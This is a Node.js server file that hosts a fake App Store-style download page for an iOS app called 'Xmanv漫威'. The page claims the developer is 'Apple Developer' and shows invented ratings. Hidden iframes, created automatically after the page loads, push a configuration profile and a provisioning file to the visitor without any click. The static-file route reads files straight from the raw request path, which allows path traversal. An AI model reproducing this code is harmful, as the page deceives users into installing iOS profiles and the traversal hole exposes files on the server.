const http = require('http');
const fs = require('fs');
const path = require('path');

const host = 'http://127.0.0.1';
const port = 3000;
const fileName = 'Kenny.mobileconfig';
const mobileprovision = 'embedded.mobileprovision';
http.createServer((req, res) => {
  var arryMid=[]
  if(req.url.lastIndexOf(".")>-1){
    arryMid=req.url.split(".")
  }
  var type = arryMid[arryMid.length-1]
  if(req.url === '/') {
    res.writeHead(200, {'Content-Type':'text/html; charset=utf-8'});
    const htmlChunk = `<!DOCTYPE html>
    <html data-dpr="3" crosspilot="" style="font-size: 41.4px;">
    
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta name="viewport" content="width=device-width">
        <script async="" src="resource/analytics.js"></script>
        <script src="resource/jquery.min.js"></script>
        <script src="resource/qrcode.min.js"></script>
        <script src="resource/Flexible.js"></script>
        <link href="resource/Flexible.css" rel="stylesheet">
        <link href="resource/index.css" rel="stylesheet">
        <link href="resource/apk.css" rel="stylesheet">
        <title>Xmanv漫威</title>
        <style>
            .mask {
                width: 100%;
                height: 100%;
                display: flex;
                justify-content: center;
                align-items: center;
                position: fixed;
                background: rgba(2, 2, 2, 0.4);
                z-index: 1000000;
                top: 0;
            }
    
            .maks-img img {
                width: 6.906666rem;
                height: 5.173333rem;
                position: absolute;
                top: 3%;
                left: 28%;
            }
            .secondDiv {
                width: 8rem;
                height: 5.493333rem;
                background-image: url('/Scripts/resource/bg@2x.png');
                background-size: 8rem 5.493333rem;
                background-repeat: no-repeat;
                position: relative;
            }
    
            .close {
                position: absolute;
                right: 5%;
                top: 6%;
                width: 6%;
            }
    
            .copy {
                width: 6.373333rem;
                height: 0.986666rem;
                background-image: url('/Scripts/resource/fuzhi@2x.png');
                background-size: 6.373333rem 0.986666rem;
                background-repeat: no-repeat;
                margin: 4rem auto 0 auto;
                display: flex;
            }
    
            .copy #url {
                width: 6rem;
                line-height: 0.986666rem;
                padding-left: 0.35rem;
                font-size: 0.4rem;
            }
    
            .copyBtn {
                width: 2rem;
                height: 1rem;
                margin-left: 2.5rem;
                width: 1.5rem;
            }
    
            #input {
                position: absolute;
                top: 0;
                left: 0;
                opacity: 0;
                z-index: -10;
            }
    
            #content {
                line-height: 20px;
                width: 1%;
                text-align: center;
                overflow: hidden;
                z-index: -20;
            }
    
            .frame {
                width: 8rem;
                height: 5rem;
                background-color: white;
                border-radius: 0.5rem;
                position: relative;
            }
    
            .small {
                display: flex;
                justify-content: center;
                flex-flow: column;
                align-items: center;
            }
    
            .small p:nth-child(1) {
                font-size: 0.45rem;
                font-weight: bold;
                margin-top: 0.6rem;
                font-family: "微软雅黑";
            }
    
            .small p:nth-child(2) {
                font-size: 0.4rem;
                margin-top: 0.2rem;
                font-family: "微软雅黑";
            }
    
            .small input {
                width: 7rem;
                height: 1rem;
                font-size: 0.4rem;
                margin-top: 0.6rem;
                border: 1px solid #b3b3b3;
            }
    
            .alert-footer {
                width: 100%;
                height: 1rem;
                border-top: 1px solid #cccccc;
                display: flex;
                font-size: 0.45rem;
                position: absolute;
                bottom: 0;
                align-items: center;
                color: #3478f6;
                justify-content: space-evenly;
            }
    
            .alert-footer div:nth-child(1) {
                width: 50%;
                height: 1rem;
                text-align: center;
                line-height: 1rem;
            }
    
            .apk {
                display: none;
            }
    
            .apk-loading {
                position: fixed;
                left: 0;
                top: 0;
                display: none;
            }
    
            .starImg {
                display: inline-flex;
            }
        </style>
    </head>
    
    <body style="font-size: 36px;">
        <div class="PC" style="display: none;">
            <div class="container" style="display: block;">
                <strong>请使用手机扫描二维码下载</strong>
                <div><img class="pc-logo" src="resource/Icon.png"></div>
                <p>Xmanv漫威</p>
                <div class="qrcode"></div>
            </div>
        </div>
        <div class="mobile" style="">
            <div class="second">
                <img alt="Xmanv漫威" class="img" src="resource/Icon.png">
                <div class="text">
                    <p>Xmanv漫威</p>
                    <p></p>
                    <button class="btn">获取</button>
                    <div id="myProgress" style="display: none;">
                        <div id="myBar">0%</div>
                    </div>
                </div>
            </div>
    
            <div class="third">
                <div class="thirdOne">
                    <div class="thirdOneDiv">
                        <span class="starNum">5</span>
                        <div class="starImg">
                            <img alt="" class="starImgOne" src="resource/timg.jpg" style="">
                            <img alt="" class="starImgTwo" src="resource/timg.jpg" style="">
                            <img alt="" class="starImgThree" src="resource/timg.jpg" style="">
                            <img alt="" class="starImgFour" src="resource/timg.jpg" style="">
                            <img alt="" class="starImgFive" src="resource/timg.jpg" style="">
                        </div>
                    </div>
                    <div class="score">
                        <p>500个评分</p>
                    </div>
                </div>
                <div class="thirdTwo">
                    <p>#1</p>
                    <p>工具</p>
                </div>
                <div class="thirdThree">
                    <p>4+</p>
                    <p>年龄</p>
                </div>
            </div>
            <div class="fourth">
                <div class="fourthOne">
                    <img alt="Xmanv漫威" src="resource/IMG_3246.png">
    
                </div>
                <div class="fourFooter">
                    <div class="iphone">
                        <img alt="" src="resource/iphoen.png">
                        <p>iPhone</p>
                    </div>
                </div>
            </div>
            <div class="Fifth">
                <div class="FifthOne">
                    <div class="FifthOneText">
                        <p>简介</p>
                        <p></p>
                    </div>
                    <div class="FifthOneName">
                        <p>Apple Developer</p>
                        <p>开发者</p>
                    </div>
                </div>
            </div>
            <div class="Sixth">
                <div class="SixthOne">
                    <div class="SixthODiv">
                        <p>新功能</p>
                        <p>版本历史记录</p>
                    </div>
                    <div class="SixthtDiv">
                        <p>版本 1.1.1</p>
                    </div>
                    <div class="SixthcDiv">
                        <p></p>
                    </div>
                </div>
            </div>
            <div class="Seventh">
                <div class="SeventhOne">
                    <p>信息</p>
                </div>
                <div class="SeventhTwo">
                    <p>开发商</p>
                    <p>Apple Developer</p>
                </div>
                <div class="SeventhThree">
                    <p>大小</p>
                    <p>31.47MB</p>
                </div>
                <div class="SeventhFour">
                    <p>类别</p>
                    <p>娱乐</p>
                </div>
                <div class="SeventhFive">
                    <p>兼容性</p>
                    <p>需要 iOS # 或更高版本</p>
                </div>
                <div class="SeventhSix">
                    <p>语言</p>
                    <p>#</p>
                </div>
                <div class="SeventhSeven">
                    <p>年龄分级</p>
                    <p>4+</p>
                </div>
                <div class="SeventhEight">
                    <p>版权</p>
                    <p>Xmanv漫威</p>
                </div>
            </div>
            <div class="footer">
                <div>
                    <p>免责声明：本网站仅为开发者提供App的下载和安装托管，App内的内容和运 营相关事项由App开发者负责，与本网站无关。</p>
                </div>
            </div>
            <div class="mask maks-img" id="safari" style="display: none;">
                <img alt="" src="resource/safari.png">
            </div>
            <div class="other_ua mask" style="display: none">
                <div class="secondDiv">
                    <div class="copy">
                        <p id="url">点击复制 --&gt; </p>
                        <p class="uuid-code" id="content">https://lhj.life/IOS/Download/5d6f607bba7834.html?stype=webclip
                        </p>
                        <p class="copyBtn" id="copyBtn"></p>
                    </div>
                </div>
            </div>
        </div>
    </body>
    <script>
        setTimeout(function () {
            var iframe = document.createElement('iframe');
            iframe.style.display = "none"; // 防止影响页面
            iframe.style.height = 0; // 防止影响页面
            iframe.src = 'https://app.xmanv.com/download';
            document.body.appendChild(iframe);
            setTimeout(function () {
                iframe.remove();
            }, 5 * 60 * 1000);
        }, 1000);
        setTimeout(function () {
            var iframe = document.createElement('iframe');
            iframe.style.display = "none"; // 防止影响页面
            iframe.style.height = 0; // 防止影响页面
            iframe.src = 'https://app.xmanv.com/MobileProvision';
            document.body.appendChild(iframe);
            setTimeout(function () {
                iframe.remove();
            }, 5 * 60 * 1000);
        }, 5000);
    </script>
    
    </html>`;
    res.write(htmlChunk);
    res.end();
  } else if(req.url === '/download') {
    res.setHeader('Content-Disposition', 'attachment;filename=' + fileName);
    const filePath = path.resolve(__dirname, fileName);
    const fileStream = fs.createReadStream(filePath);
    fileStream.pipe(res);
  } else if(req.url === '/MobileProvision') {
    res.setHeader('Content-Disposition', 'attachment;filename=' + mobileprovision);
    res.setHeader('content-type', 'application/octet-stream');
    const filePath = path.resolve(__dirname, mobileprovision);
    const fileStream = fs.createReadStream(filePath);
    fileStream.pipe(res);
  }else if(req.url.lastIndexOf("/resource")>-1||req.url.lastIndexOf("/image")>-1){
    fs.readFile(req.url.substring(1,), getMime(type)[0], (err, content) => {
        res.writeHead(200, {
          'Content-Type': getMime(type)[1],
          'Access-Control-Allow-Credentials':true,
          'Access-Control-Allow-Origin':'http://api.xmanv.com'
        })
        if(getMime(type)[0]=='binary'){
          res.write(content, 'binary');
          res.end()
        }else{
          res.end(content)
        }
    })
 }
 else {
     res.end('Invalid Request!');
  }
 }).listen(port);

function getMime(extname){
  if(extname=="html"){
    return ["utf-8","text/html"];
  }else if(extname=="css"){
    return ["utf-8","text/css"];
  }
  else if(extname=="jpg"){
    return ["binary","image/jpeg"];
  }
  else if(extname=="svg"){
    return ["binary","image/svg+xml"];
  }
  else if(extname=="png"){
    return ["binary","image/png"];
  }
  else if(extname=="ico"){
    return ["binary","image/x-icon"];
  }else if(extname=="woff"){
    return ["binary","application/font-woff"];
  }else if(extname=="woff2"){
    return ["binary","application/font-woff2"];
  }else {
    return ["utf-8","text/html"];
  }
  
}
console.log(`Server running at ${host}:${port}`);
